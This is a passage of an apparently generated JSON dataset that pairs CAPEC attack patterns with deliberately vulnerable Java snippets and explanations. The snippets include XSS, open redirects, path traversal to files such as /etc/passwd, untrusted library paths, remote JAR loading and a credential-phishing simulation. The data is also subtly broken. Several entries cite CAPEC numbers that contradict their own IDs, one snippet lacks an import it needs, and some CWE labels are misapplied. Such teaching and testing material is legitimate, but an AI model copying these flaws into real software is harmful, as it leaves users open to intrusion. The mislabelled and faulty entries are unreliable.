        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ResourceLocationSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // Vulnerable code: URL is hardcoded and can be spoofed\n            String urlString = \"http://trustedserver.com/resource\";\n            URL url = new URL(urlString);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-940: No verification of the source of the communication channel\n            if (conn.getResponseCode() == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuffer content = new StringBuffer();\n                while ((inputLine = in.readLine()) != null) {\n                    content.append(inputLine);\n                }\n                in.close();\n                System.out.println(\"Resource content: \" + content.toString());\n            } else {\n                System.out.println(\"Failed to fetch resource\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of resource location spoofing. The code attempts to fetch a resource from a hardcoded URL (http://trustedserver.com/resource). This is vulnerable to spoofing because the URL is not verified or validated, and the source of the communication channel is not properly checked (CWE-940). An attacker could potentially redirect the request to a malicious server by manipulating DNS or other means, leading to the application fetching and using a malicious resource. This embodies the main idea of CAPEC-111: Resource Location Spoofing."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class InsecureTempFileExample {\n    public static void main(String[] args) {\n        try {\n            // Create a temporary file in the system's default temp directory\n            File tempFile = File.createTempFile(\"tempData\", \".txt\");\n\n            // Write sensitive information to the temporary file\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Sensitive Information: User Password = 'password123'\");\n            writer.close();\n\n            // Set insecure permissions (readable by others)\n            Set<PosixFilePermission> perms = PosixFilePermissions.fromString(\"rw-r--r--\");\n            Files.setPosixFilePermissions(Paths.get(tempFile.getAbsolutePath()), perms);\n\n            System.out.println(\"Temporary file created at: \" + tempFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation and use of an insecure temporary file, embodying the main idea of the CAPEC 'Screen Temporary Files for Sensitive Information'. The code creates a temporary file in the system's default temporary directory and writes sensitive information to it. It then sets insecure file permissions (readable by others), making the sensitive information potentially accessible to unintended actors. This example highlights the vulnerabilities described in the related CWEs, such as creating temporary files with insecure permissions (CWE-378) and storing sensitive data in a way that can be accessed by unauthorized users (CWE-524)."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class SniffingAttackExample {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"username=admin&password=12345\";\n            out.println(\"POST /login HTTP/1.1\");\n            out.println(\"Host: example.com\");\n            out.println(\"Content-Type: application/x-www-form-urlencoded\");\n            out.println(\"Content-Length: \" + sensitiveData.length());\n            out.println();\n            out.println(sensitiveData);\n\n            // Read response (not checking integrity, CWE-924)\n            String responseLine;\n            while ((responseLine = in.readLine()) != null) {\n                System.out.println(responseLine);\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a network communication where sensitive information is transmitted in cleartext, embodying the concept of a Sniffing Attack (CAPEC-156). The code connects to a server (example.com) over an unencrypted channel (HTTP on port 80) and sends sensitive data (username and password) in cleartext. This makes it vulnerable to interception by an unauthorized actor who can sniff the network traffic. Additionally, the code does not ensure the integrity of the received message (CWE-924), further exposing it to potential tampering. This example highlights the importance of encrypting sensitive data (CWE-311) and ensuring message integrity during transmission."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        String serverAddress = \"example.com\";\n        int port = 12345;\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream outputStream = socket.getOutputStream();\n             BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n            // Sending sensitive information in cleartext\n            String sensitiveData = \"username=admin&password=admin123\";\n            outputStream.write(sensitiveData.getBytes());\n            outputStream.flush();\n\n            // Reading server response\n            String response;\n            while ((response = reader.readLine()) != null) {\n                System.out.println(\"Server response: \" + response);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client application that sends sensitive information (username and password) in cleartext over a network connection. The client connects to a server using a socket and transmits the sensitive data without any encryption. This embodies the main idea of the CAPEC 'Sniffing Network Traffic' by exposing the sensitive information to potential sniffing attacks. The related CWEs are represented as follows:\n- CWE-311 (Missing Encryption of Sensitive Data): The sensitive data is not encrypted before transmission.\n- CWE-319 (Cleartext Transmission of Sensitive Information): The sensitive data is transmitted in cleartext.\n- CWE-294 (Authentication Bypass by Capture-replay): The cleartext transmission could be captured and replayed by an attacker to bypass authentication.\nThis code highlights the importance of encrypting sensitive data before transmission to prevent unauthorized access and sniffing attacks."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class LibraryLoader {\n    public static void main(String[] args) {\n        String userSuppliedPath = args[0]; // CWE-73: External Control of File Name or Path\n        loadLibrary(userSuppliedPath);\n    }\n\n    public static void loadLibrary(String path) {\n        try {\n            // CWE-427: Uncontrolled Search Path Element\n            System.setProperty(\"java.library.path\", path);\n            // CWE-426: Untrusted Search Path\n            System.loadLibrary(\"exampleLibrary\");\n        } catch (UnsatisfiedLinkError e) {\n            System.err.println(\"Failed to load library: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a library from a user-supplied path. The main idea of the CAPEC is represented by allowing an adversary to redirect the application's attempts to access external libraries to a path they control. The code takes a path from user input (CWE-73) and sets it as the library search path (CWE-427). It then attempts to load a library from this path (CWE-426). If an adversary supplies a malicious path, they can force the application to execute arbitrary code, potentially compromising the system."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String script = request.getParameter(\"script\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<script>\" + script + \"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is directly embedded into a web page without proper validation or neutralization. The 'script' parameter from the HTTP request is directly inserted into a <script> tag in the HTML response. This can lead to Cross-Site Scripting (XSS) attacks, where an attacker can inject malicious scripts that will be executed in the context of the user's browser. This example embodies the main idea of CAPEC-111 (Exploit Script-Based APIs) and is related to several CWEs, including CWE-79 (Cross-site Scripting) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page)."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableNetworkCommunication {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/api/data\"; // CWE-941: Incorrectly Specified Destination\n            URL url = new URL(targetUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            // No validation of the endpoint's identity\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuffer response = new StringBuffer();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // CWE-924: Improper Enforcement of Message Integrity During Transmission\n                // No integrity check on the received message\n\n                System.out.println(\"Response: \" + response.toString());\n            } else {\n                System.out.println(\"GET request failed\");\n            }\n        } catch (Exception e) {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            e.printStackTrace(); // Exposing stack trace to unauthorized users\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable network communication scenario that embodies the main idea of CAPEC-225: Infrastructure Manipulation. The code attempts to connect to a specified URL and retrieve data without properly validating the endpoint's identity (CWE-923), ensuring the integrity of the message during transmission (CWE-924), or correctly specifying the intended destination (CWE-941). Additionally, it exposes sensitive system information through stack traces (CWE-497). This setup can be exploited by attackers to manipulate network infrastructure, redirect traffic, and intercept or alter communications, potentially leading to unauthorized access and data breaches."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/purchase\")\npublic class PurchaseServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Retrieve hidden field values from the client-side form\n        String itemId = request.getParameter(\"itemId\");\n        String price = request.getParameter(\"price\");\n        String quantity = request.getParameter(\"quantity\");\n\n        // Insecure: Trusting client-side values without validation\n        double totalPrice = Double.parseDouble(price) * Integer.parseInt(quantity);\n\n        // Process the purchase with the manipulated price\n        response.getWriter().println(\"Total price for item \" + itemId + \" is: \" + totalPrice);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of a purchase transaction. The server retrieves hidden field values (itemId, price, quantity) from the client-side form without proper validation or verification. This allows an attacker to manipulate these values (e.g., changing the price) before submitting the form, leading to incorrect total price calculations. This embodies the CAPEC of 'Manipulating Hidden Fields' and highlights related CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602) and 'Reliance on Untrusted Inputs in a Security Decision' (CWE-807)."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/redirect\")\npublic class OpenRedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            response.sendRedirect(targetUrl);\n        } else {\n            response.getWriter().write(\"Invalid URL\");\n        }\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates a potential vulnerability related to the CAPEC-98 (Spear Phishing) attack, specifically CWE-601 (URL Redirection to Untrusted Site). The servlet takes a 'url' parameter from the HTTP request and redirects the user to that URL without any validation. This can be exploited in a spear phishing attack where an attacker sends a targeted email with a link to this servlet, which then redirects the user to a malicious site. The code snippet highlights the risk of open redirects, which can be used to deceive users into visiting untrusted sites, thereby facilitating phishing attacks."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import java.util.Scanner;\n\npublic class MobilePhishingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"You have received a new message: 'Your account has been compromised. Please visit http://fakebank.com to secure your account.'\");\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        // Simulate sending credentials to a malicious server\n        sendCredentialsToServer(username, password);\n        System.out.println(\"Your account has been secured.\");\n    }\n\n    private static void sendCredentialsToServer(String username, String password) {\n        // In a real phishing attack, this method would send the credentials to an attacker's server\n        System.out.println(\"Sending credentials to malicious server...\");\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n    }\n}",
        "description": "This Java code snippet simulates a mobile phishing attack where a user receives a fake message prompting them to visit a malicious website and enter their credentials. The code demonstrates how an attacker might solicit sensitive information from a user by misrepresenting critical information (CWE-451) and exploiting the use of single-factor authentication (CWE-308). The `sendCredentialsToServer` method represents the malicious action of sending the user's credentials to an attacker's server. This example highlights the risks associated with mobile phishing and the importance of secure authentication mechanisms."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import java.io.*;\n\npublic class FileManipulationExample {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java FileManipulationExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        File file = new File(filename);\n\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of file manipulation vulnerability. The program takes a filename as a command-line argument and reads the file's contents, printing each line to the console. The vulnerability lies in the fact that the filename is taken directly from user input without any validation or sanitization. This can lead to several issues:\n\n1. **External Control of File Name or Path (CWE-73)**: An attacker can provide a path to a sensitive file, such as `/etc/passwd`, leading to unauthorized access to sensitive information.\n2. **Path Traversal (CWE-22)**: An attacker can use path traversal sequences (e.g., `../../etc/passwd`) to access files outside the intended directory.\n3. **Reliance on File Name or Extension (CWE-646)**: The program does not check the file type or extension, which could lead to processing unexpected file types.\n4. **Insecure Temporary File (CWE-377)**: If the filename points to a temporary file, it could be manipulated by an attacker.\n5. **Improper Control of Resource Identifiers (CWE-99)**: The filename is used directly as a resource identifier without any restrictions, allowing potential resource injection attacks.\n\nThis code snippet embodies the main idea of the CAPEC by demonstrating how improper handling of file names and paths can lead to various security vulnerabilities."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "public class SystemReset {\n    private static boolean isAuthenticated = false;\n    private static int securitySetting = 1; // 1 means secure, 0 means insecure\n\n    public static void main(String[] args) {\n        // Simulate a power state transition\n        powerStateTransition();\n\n        // Attempt to reset system values\n        resetSystemValues();\n\n        // Check security setting after reset\n        System.out.println(\"Security Setting: \" + securitySetting);\n    }\n\n    private static void powerStateTransition() {\n        // Simulate improper lock behavior after power state transition\n        securitySetting = 0; // Security setting becomes insecure\n    }\n\n    private static void resetSystemValues() {\n        if (!isAuthenticated) {\n            // Missing authentication for critical function\n            securitySetting = 0; // Reset security setting to insecure value\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can force the system to reset values to a previous insecure state. The `powerStateTransition` method simulates a power state transition that improperly unlocks security settings, making them insecure (CWE-1232). The `resetSystemValues` method resets the security setting without any authentication check (CWE-306), leading to an insecure state. This embodies the main idea of CAPEC-272, where an attacker leverages weaknesses in state-dependent factors to reset the system to a vulnerable configuration."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataLogger {\n    private static final String TRACE_FILE = \"/tmp/trace.log\";\n\n    public static void main(String[] args) {\n        try {\n            logSensitiveData(\"Sensitive system information: User credentials\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void logSensitiveData(String data) throws IOException {\n        File traceFile = new File(TRACE_FILE);\n        try (FileWriter writer = new FileWriter(traceFile, true)) {\n            writer.write(data + \"\\n\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the CAPEC 'White Box Reverse Engineering' and associated CWEs. The code logs sensitive system information (e.g., user credentials) to an unprotected file located at '/tmp/trace.log'. This represents CWE-1323 (Improper Management of Sensitive Trace Data) as the trace data is stored in an unprotected location. Additionally, it exposes sensitive system information (CWE-497) to unauthorized control spheres, as the file can be accessed by unauthorized users. The code snippet embodies the main idea of the CAPEC by showing how sensitive information can be exposed through improper handling and storage, making it susceptible to reverse engineering and unauthorized access."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class ADSExample {\n    public static void main(String[] args) {\n        try {\n            // Create a file\n            File file = new File(\"example.txt\");\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Create an alternate data stream\n            FileOutputStream adsStream = new FileOutputStream(\"example.txt:hiddenStream\");\n            String secretData = \"Sensitive information hidden in ADS\";\n            adsStream.write(secretData.getBytes());\n            adsStream.close();\n\n            System.out.println(\"Alternate Data Stream created and data written.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation of an Alternate Data Stream (ADS) in a Windows NTFS file system. The code creates a file named 'example.txt' and then creates an ADS named 'hiddenStream' within that file. Sensitive information is written to the ADS, effectively hiding it from standard file system utilities. This embodies the main idea of CAPEC-180, where an attacker can exploit ADS to hide malicious data or tools. The code also touches on CWE-212 (Improper Removal of Sensitive Information Before Storage or Transfer) by storing sensitive information in a hidden stream, CWE-69 (Improper Handling of Windows ::DATA Alternate Data Stream) by not preventing or detecting the use of ADS, and CWE-427 (Uncontrolled Search Path Element) by potentially allowing hidden data to be executed if the search path is manipulated."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.FileNotFoundException;\nimport java.util.Scanner;\n\npublic class SensitiveInfoExposure {\n    public static void main(String[] args) {\n        File file = new File(\"config.txt\");\n        try {\n            Scanner scanner = new Scanner(file);\n            while (scanner.hasNextLine()) {\n                String line = scanner.nextLine();\n                if (line.contains(\"password\")) {\n                    System.out.println(line); // CWE-200: Exposing sensitive information\n                }\n            }\n            scanner.close();\n        } catch (FileNotFoundException e) {\n            System.out.println(\"File not found\"); // CWE-205: Observable behavioral discrepancy\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information, such as passwords, is exposed to unauthorized actors (CWE-200). The code reads a configuration file and prints lines containing the word 'password', which could reveal sensitive information. Additionally, the error message 'File not found' can indicate to an attacker that the file does not exist, revealing a behavioral discrepancy (CWE-205). This aligns with the CAPEC concept of footprinting, where an adversary probes and explores to identify constituents and properties of the target."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class WebAppFingerprinting {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com\";\n            URL url = new URL(targetUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // CWE-598: Use of GET Request Method With Sensitive Query Strings\n            connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n\n            int responseCode = connection.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder response = new StringBuilder();\n\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            System.out.println(\"Response: \" + response.toString());\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String serverInfo = connection.getHeaderField(\"Server\");\n            System.out.println(\"Server Info: \" + serverInfo);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of web application fingerprinting. The code sends an HTTP GET request to a target URL and prints the response code, response body, and server information. This process can reveal sensitive information about the web application, such as server type and version, which can be used to identify vulnerabilities. The code also highlights several related CWEs: CWE-598 (using GET requests with sensitive query strings), CWE-209 (generating error messages with sensitive information), and CWE-497 (exposing sensitive system information). This information can be leveraged by an attacker to plan more targeted attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter variable name: \");\n        String varName = scanner.nextLine();\n        System.out.print(\"Enter value: \");\n        String value = scanner.nextLine();\n\n        // Using eval-like functionality to dynamically set a variable\n        try {\n            // This is a placeholder for dynamic evaluation, which is not directly supported in Java\n            // In a real scenario, this could be a reflection or script engine usage\n            if (varName.equals(\"username\")) {\n                String username = value;\n                System.out.println(\"Username set to: \" + username);\n            } else if (varName.equals(\"password\")) {\n                String password = value;\n                System.out.println(\"Password set to: \" + password);\n            } else {\n                System.out.println(\"Invalid variable name\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to CAPEC-77: Manipulating User-Controlled Variables. The code takes user input to determine the name and value of a variable, and then attempts to set the variable dynamically. Although Java does not support direct dynamic variable evaluation like some scripting languages, the example uses conditional statements to simulate this behavior. This approach can lead to security issues such as CWE-914 (Improper Control of Dynamically-Identified Variables) and CWE-95 (Eval Injection) if the input is not properly validated. The code also highlights CWE-1126 (Declaration of Variable with Unnecessarily Wide Scope) by declaring variables that are only used within a narrower scope."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "import javax.swing.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class ActionSpoofingExample {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"Action Spoofing Example\");\n        JButton button = new JButton(\"Submit Query\");\n\n        // Vulnerable ActionListener\n        button.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                // User thinks this will submit a query\n                // But it actually downloads a file\n                downloadFile();\n            }\n        });\n\n        frame.getContentPane().add(button);\n        frame.setSize(300, 200);\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setVisible(true);\n    }\n\n    private static void downloadFile() {\n        // Simulate file download\n        System.out.println(\"Downloading file...\");\n    }\n}",
        "description": "This Java code snippet demonstrates an example of Action Spoofing. The user interface (UI) presents a button labeled 'Submit Query', which misleads the user into thinking that clicking the button will submit a query. However, the ActionListener attached to the button actually triggers a file download instead. This embodies the main idea of CAPEC-139 (Action Spoofing) by disguising one action (file download) as another (query submission). The code also touches on CWE-451 (UI Misrepresentation of Critical Information) as the button's label misrepresents the action it performs."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashParameterInjection extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String flashParam = request.getParameter(\"flashParam\");\n        String htmlContent = \"<html><body>\" +\n                \"<embed src='movie.swf' FlashVars='\" + flashParam + \"'></embed>\" +\n                \"</body></html>\";\n        response.setContentType(\"text/html\");\n        response.getWriter().write(htmlContent);\n    }\n}\n",
        "description": "This Java servlet code demonstrates a Flash Parameter Injection vulnerability. The servlet takes a user-supplied parameter 'flashParam' from the HTTP request and directly embeds it into the HTML content without proper validation or sanitization. This allows an attacker to inject malicious global parameters into the Flash file embedded within the HTML document. The code snippet also touches on related CWEs: improper neutralization of special elements (CWE-1336) and unrestricted upload of dangerous types (CWE-434), as the user input is not sanitized and could include harmful content."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class CodeInclusionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CodeInclusionExample <url-to-jar>\");\n            return;\n        }\n\n        try {\n            URL jarUrl = new URL(args[0]);\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{jarUrl});\n            Class<?> loadedClass = classLoader.loadClass(\"com.example.MaliciousClass\");\n            Runnable instance = (Runnable) loadedClass.getDeclaredConstructor().newInstance();\n            instance.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a code inclusion vulnerability. The program takes a URL to a JAR file as an argument, loads the JAR file from the specified URL, and attempts to instantiate and run a class named 'com.example.MaliciousClass' from the JAR. This embodies the CAPEC concept of 'Code Inclusion' by retrieving and executing code from an external source. The related CWEs are represented as follows: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) is shown by loading a JAR from an external URL, CWE-506 (Embedded Malicious Code) is implied by the potential for the JAR to contain malicious code, CWE-94 (Code Injection) is represented by the dynamic loading and execution of code, CWE-98 (PHP Remote File Inclusion) is analogous to the inclusion of a remote JAR file, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) is demonstrated by the lack of restrictions on the dynamically loaded class."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class ConfigManipulation {\n    private Properties config;\n\n    public ConfigManipulation(String configFilePath) throws IOException {\n        config = new Properties();\n        try (FileInputStream fis = new FileInputStream(configFilePath)) {\n            config.load(fis);\n        }\n    }\n\n    public String getConfigValue(String key) {\n        return config.getProperty(key);\n    }\n\n    public void setConfigValue(String key, String value) throws IOException {\n        config.setProperty(key, value);\n        // Save the properties back to the file (potentially insecure)\n        try (FileOutputStream fos = new FileOutputStream(\"config.properties\")) {\n            config.store(fos, null);\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            ConfigManipulation cm = new ConfigManipulation(\"config.properties\");\n            System.out.println(\"Initial Config: \" + cm.getConfigValue(\"setting1\"));\n            cm.setConfigValue(\"setting1\", \"new_value\");\n            System.out.println(\"Updated Config: \" + cm.getConfigValue(\"setting1\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple configuration manipulation scenario. The `ConfigManipulation` class loads configuration settings from an external file (`config.properties`). The `setConfigValue` method allows modification of these settings and saves them back to the file. This represents a potential vulnerability where an attacker could manipulate the configuration file to alter the application's behavior. This example embodies the CAPEC concept of 'Configuration/Environment Manipulation' and highlights CWE-15 ('External Control of System or Configuration Setting')."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableFileLoader {\n    public static void main(String[] args) {\n        String fileName = \"config.properties\";\n        File file = new File(fileName);\n        \n        try (FileInputStream fis = new FileInputStream(file)) {\n            // Load the file\n            System.out.println(\"File loaded: \" + file.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a file based solely on its name, without considering the file's location or verifying its authenticity. The code attempts to load a file named 'config.properties' using the FileInputStream class. If an attacker creates a malicious file with the same name in a directory that is searched before the legitimate file's directory, the application will load the attacker's file instead. This embodies the main idea of the CAPEC by exploiting file location algorithms and the related CWEs, such as CWE-706 (Use of Incorrectly-Resolved Name or Reference) and CWE-73 (External Control of File Name or Path)."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashRedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String targetUrl = request.getParameter(\"targetUrl\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            response.sendRedirect(targetUrl);\n        } else {\n            response.getWriter().write(\"Invalid URL\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation that embodies the main idea of the CAPEC 'Cross-Site Flashing'. The servlet takes a 'targetUrl' parameter from the HTTP request and redirects the user to that URL without any validation. This represents CWE-601 (URL Redirection to Untrusted Site), which can be exploited by an attacker to redirect users to malicious sites. The code snippet highlights the risk of allowing user-controlled input to dictate redirection targets, which can be leveraged in a Cross-Site Flashing attack where a crafted link can cause a Flash document to execute unintended actions."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
